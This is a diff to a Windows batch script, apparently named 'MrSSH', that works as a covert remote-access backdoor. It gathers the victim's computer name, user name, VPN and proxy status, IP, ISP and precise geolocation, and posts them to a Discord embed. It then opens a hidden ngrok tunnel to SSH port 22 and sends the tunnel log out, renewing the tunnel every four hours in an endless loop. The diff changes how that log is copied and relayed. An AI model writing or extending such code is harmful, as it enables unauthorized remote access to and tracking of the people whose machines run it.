@@ -37,13 +37,16 @@ FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter country`) 
 
 call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":bookmark_tabs: __**Security, PC config**__ \\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username% \\n\\n:file_cabinet: **Using VPN?:** %vpn% \\n\\n:map: **Using proxy?:** %proxy% \\n\\n:house:**Ip address:** %local% (%isp%) \\n\\n\\n:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% \\n\\n:japan: **Region:** %region% \\n\\n:cityscape: **City:** %city% (%lat%; %lon%) \\n\\n:timer: **Timezone:** %zone%" "52bf90" "https://i.imgur.com/b2Terft.png"
 
+mkdir log
 tar -xf ngrok.zip
 
-start /B "discordmsg" silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10 & taskkill /IM ngrok.exe /F 
-start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
+start /B "copy" silentcmd xcopy /h /Y ngrok.log %temp%\log\ /DELAY:10
+start /B "discordmsg" silentcmd %temp%\NgrokRun.bat /DELAY:10
+start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
 
 :ngrokloop
 call source.bat +silent --embed "Renewing the MrSSH session for %computername%\%username% (%local%)..." " " "52bf90" "https://i.imgur.com/b2Terft.png"
-start /B "discordmsg" silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10 & taskkill /IM ngrok.exe /F
-start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
+start /B "copy" silentcmd xcopy /h /Y ngrok.log %temp%\log\ /DELAY:10
+start /B "discordmsg" silentcmd NgrokRun.bat /DELAY:10
+start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
 goto ngrokloop
